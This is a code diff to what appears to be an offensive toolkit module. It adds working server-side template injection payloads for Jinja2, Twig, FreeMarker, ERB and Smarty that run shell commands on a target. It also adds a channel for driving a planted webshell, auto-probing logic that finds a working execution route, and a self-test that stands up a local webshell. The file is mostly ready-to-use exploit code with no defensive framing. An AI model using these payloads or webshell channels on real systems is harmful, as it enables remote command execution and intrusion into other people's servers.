@@ -55,23 +55,55 @@ class CommandInjection(ExecChannel):
         return _between(body, s, e)
 
 
+def _sq(cmd: str) -> str:
+    return cmd.replace("'", "'\\''")
+
+
+# Per-engine template-injection payloads that shell out.
+SSTI_ENGINES = {
+    "jinja2": lambda c: "{{cycler.__init__.__globals__.os.popen('" + _sq(c) + "').read()}}",
+    "twig": lambda c: "{{['" + _sq(c) + "']|map('system')|join}}",
+    "freemarker": lambda c: '<#assign e="freemarker.template.utility.Execute"?new()>${e("'
+                            + c.replace('"', '\\"') + '")}',
+    "erb": lambda c: "<%= `" + c.replace("`", "\\`") + "` %>",
+    "smarty": lambda c: "{system('" + _sq(c) + "')}",
+}
+
+
 class SSTI(ExecChannel):
-    """Jinja2 server-side template injection to os.popen (Flask `cycler` global)."""
-    kind = "ssti"
+    """Server-side template injection → command execution, across template engines."""
 
-    def __init__(self, session, url, param):
-        self.session, self.url, self.param = session, url, param
+    def __init__(self, session, url, param, engine="jinja2"):
+        self.session, self.url, self.param, self.engine = session, url, param, engine
+        self.kind = f"ssti-{engine}"
 
-    @staticmethod
-    def payload(command: str) -> str:
-        esc = command.replace("'", "'\\''")
-        return "{{cycler.__init__.__globals__.os.popen('" + esc + "').read()}}"
+    @classmethod
+    def payload(cls, command: str, engine: str = "jinja2") -> str:
+        return SSTI_ENGINES[engine](command)
 
     def run(self, command: str) -> str:
         s, e = _markers()
         try:
             body = self.session.get(self.url, headers=UA, timeout=20,
-                                    params={self.param: self.payload(f"echo {s}; {command}; echo {e}")}).text
+                                    params={self.param: self.payload(f"echo {s}; {command}; echo {e}",
+                                                                     self.engine)}).text
+        except requests.RequestException as ex:
+            return f"[error] {ex}"
+        return _between(body, s, e)
+
+
+class WebShell(ExecChannel):
+    """A planted webshell that runs its `param` through a shell (e.g. post file upload)."""
+    kind = "webshell"
+
+    def __init__(self, session, url, param="cmd"):
+        self.session, self.url, self.param = session, url, param
+
+    def run(self, command: str) -> str:
+        s, e = _markers()
+        try:
+            body = self.session.get(self.url, headers=UA, timeout=20,
+                                    params={self.param: f"echo {s}; {command}; echo {e}"}).text
         except requests.RequestException as ex:
             return f"[error] {ex}"
         return _between(body, s, e)
@@ -86,7 +118,9 @@ def establish(session, url: str, param: str, kind: str = "auto",
         candidates += [CommandInjection(session, url, param, base, sep)
                        for sep in (";", "|", "&&", "\n")]
     if kind in ("auto", "ssti"):
-        candidates.append(SSTI(session, url, param))
+        candidates += [SSTI(session, url, param, eng) for eng in SSTI_ENGINES]
+    if kind in ("auto", "webshell"):
+        candidates.append(WebShell(session, url, param or "cmd"))
     for ch in candidates:
         try:
             if nonce in ch.run(f"echo {nonce}"):
@@ -122,7 +156,27 @@ if __name__ == "__main__":  # self-check: python -m metsec.exec_channel (real ex
     assert ch is not None and ch.kind == "cmd-injection", (ch, proof)
     assert "uid=" in proof or proof, proof  # real `id` output
     assert "metsec_marker_ok" in ch.run("echo metsec_marker_ok"), "clean output extraction"
-    srv.shutdown()
 
-    assert "os.popen" in SSTI.payload("id") and "id" in SSTI.payload("id")
+    class W(BaseHTTPRequestHandler):  # a planted webshell runs its cmd param
+        def do_GET(self):
+            cmd = parse_qs(urlparse(self.path).query).get("cmd", [""])[0]
+            self.send_response(200)
+            self.end_headers()
+            self.wfile.write(subprocess.getoutput(cmd).encode())
+
+        def log_message(self, *a):
+            pass
+
+    wsrv = HTTPServer(("127.0.0.1", 0), W)
+    threading.Thread(target=wsrv.serve_forever, daemon=True).start()
+    wch, _ = establish(requests.Session(), f"http://127.0.0.1:{wsrv.server_address[1]}/s",
+                       "cmd", kind="webshell")
+    assert wch is not None and wch.kind == "webshell", wch
+    assert "webshell_ok" in wch.run("echo webshell_ok")
+    srv.shutdown()
+    wsrv.shutdown()
+
+    assert "os.popen" in SSTI.payload("id")
+    assert "system" in SSTI.payload("id", "twig") and "Execute" in SSTI.payload("id", "freemarker")
+    assert "`id`" in SSTI.payload("id", "erb")
     print("exec_channel self-check ok")
